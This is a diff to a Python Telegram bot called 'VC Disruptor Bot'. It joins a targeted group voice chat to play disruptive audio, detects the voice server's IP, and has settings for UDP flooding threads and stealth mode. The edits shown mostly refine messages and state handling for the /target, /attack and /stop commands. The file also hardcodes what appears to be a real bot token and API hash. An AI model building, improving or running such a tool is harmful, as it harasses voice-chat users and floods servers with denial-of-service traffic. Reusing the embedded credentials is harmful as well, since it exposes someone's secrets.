@@ -19,12 +19,12 @@ from pytgcalls import PyTgCalls
 from pytgcalls.types import AudioPiped
 
 # ═══════════════════════════════════════════════════
-# CONFIGURATION - YAHAN CHANGE KAREIN
+# CONFIGURATION - CHANGE THESE
 # ═══════════════════════════════════════════════════
 
 BOT_TOKEN = "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ"
 OWNER_ID = 7302427268
-SESSION_STRING = "BQAN3s...apna_session_string..."  # 🔴 CHANGE THIS
+SESSION_STRING = "BQAN3s...apna_session_string..."  # 🔴 CHANGE THIS!
 
 AUDIO_DURATION = 20
 AUDIO_AMPLITUDE = 0.95
@@ -197,8 +197,12 @@ def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
 
 def owner_only(func):
     async def wrapper(client, message: Message):
-        if message.from_user.id != OWNER_ID:
-            await message.reply("❌ Unauthorized!")
+        try:
+            if message.from_user.id != OWNER_ID:
+                await message.reply("❌ Unauthorized!")
+                return
+        except:
+            await message.reply("❌ Error identifying user.")
             return
         return await func(client, message)
     return wrapper
@@ -208,7 +212,7 @@ async def start_cmd(client, message: Message):
     text = """
 🤖 **VC Disruptor Bot**
 
-🎯 `/target <link>` — Set target
+🎯 `/target <link>` — Set target group
 ⚔️ `/attack` — Start attack
 ⏹️ `/stop` — Stop attack
 📊 `/status` — Check status
@@ -222,6 +226,7 @@ async def start_cmd(client, message: Message):
 async def status_cmd(client, message: Message):
     text = f"""
 📊 **Status**
+─────────────
 State: `{bot_state['status']}`
 Target: {bot_state['target_name'] or 'Not set'}
 VC IP: {bot_state['vc_ip'] or 'Not detected'}
@@ -266,7 +271,7 @@ async def attack_cmd(client, message: Message):
         return
     
     if not bot_state["target_id"]:
-        await message.reply("❌ No target set!")
+        await message.reply("❌ No target set! Use /target first.")
         return
     
     chat_id = bot_state["target_id"]
@@ -280,7 +285,7 @@ async def attack_cmd(client, message: Message):
     bot_state["stop_event"] = stop_event
     
     try:
-        await message.reply("[🔍] Detecting VC IP...")
+        await message.reply("[🔍] Detecting VC IP (15s)...")
         vc_ip, vc_port = detect_vc_ip(15)
         bot_state["vc_ip"] = vc_ip
         
@@ -290,7 +295,12 @@ async def attack_cmd(client, message: Message):
             await asyncio.sleep(random.uniform(2, 5))
         
         pytgcalls = bot_state["pytgcalls"]
-        await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
+        
+        # Join voice chat with audio
+        await pytgcalls.join_group_call(
+            chat_id, 
+            AudioPiped(audio_buf)
+        )
         await message.reply(f"[✅] Audio playing for {AUDIO_DURATION}s")
         
         if vc_ip and vc_port:
@@ -334,12 +344,14 @@ async def stop_cmd(client, message: Message):
     
     bot_state["is_attacking"] = False
     bot_state["status"] = "idle"
+    bot_state["stop_event"] = None
     await message.reply("[⏹️] Attack stopped.")
 
 @owner_only
 async def settings_cmd(client, message: Message):
     text = f"""
 📋 **Settings**
+─────────────
 duration: {AUDIO_DURATION}s
 udp_duration: {UDP_DURATION}s
 threads: {UDP_THREADS}
@@ -352,7 +364,7 @@ stealth: {STEALTH_MODE}
 @owner_only
 async def set_cmd(client, message: Message):
     if len(message.command) < 3:
-        await message.reply("❌ /set duration 30")
+        await message.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
         return
     
     param = message.command[1].lower()
@@ -376,9 +388,9 @@ async def set_cmd(client, message: Message):
             save_bot_config()
             await message.reply(f"[✅] {var_name} = {val}")
         except:
-            await message.reply(f"[!] Invalid value")
+            await message.reply(f"[!] Invalid value for {param}")
     else:
-        await message.reply(f"[!] Valid: {', '.join(changes.keys())}")
+        await message.reply(f"[!] Valid params: {', '.join(changes.keys())}")
 
 @owner_only
 async def reset_cmd(client, message: Message):
@@ -391,6 +403,7 @@ async def reset_cmd(client, message: Message):
     STEALTH_MODE = True
     bot_state["target_id"] = None
     bot_state["target_name"] = None
+    bot_state["vc_ip"] = None
     if os.path.exists(CONFIG_FILE):
         os.remove(CONFIG_FILE)
     await message.reply("[✅] Reset to defaults.")
@@ -413,7 +426,7 @@ async def main():
     app = Client("vc_session", session_string=SESSION_STRING, in_memory=True)
     await app.start()
     user = await app.get_me()
-    print(f"[👤] Logged in as: {user.first_name}")
+    print(f"[👤] Logged in as: {user.first_name} (ID: {user.id})")
     
     print("[📞] Starting PyTgCalls...")
     pytgcalls = PyTgCalls(app)
@@ -423,9 +436,10 @@ async def main():
     bot_state["app"] = app
     bot_state["pytgcalls"] = pytgcalls
     
-    print("[🤖] Starting bot...")
+    print("[🤖] Starting Telegram Bot...")
     bot = Client("bot", bot_token=BOT_TOKEN, api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
     
+    # Register handlers
     bot.on_message(filters.command("start"))(start_cmd)
     bot.on_message(filters.command("status"))(status_cmd)
     bot.on_message(filters.command("target"))(target_cmd)
@@ -436,9 +450,8 @@ async def main():
     bot.on_message(filters.command("reset"))(reset_cmd)
     
     print("\n" + "="*50)
-    print("  ✅ BOT RUNNING!")
-    print("  /target <group>")
-    print("  /attack")
+    print("  ✅ BOT IS RUNNING!")
+    print("  Commands: /target, /attack, /stop")
     print("="*50 + "\n")
     
     try:
@@ -451,6 +464,7 @@ async def main():
         await bot.stop()
         await pytgcalls.stop()
         await app.stop()
+        print("[✓] Clean exit.")
 
 if __name__ == "__main__":
     try:
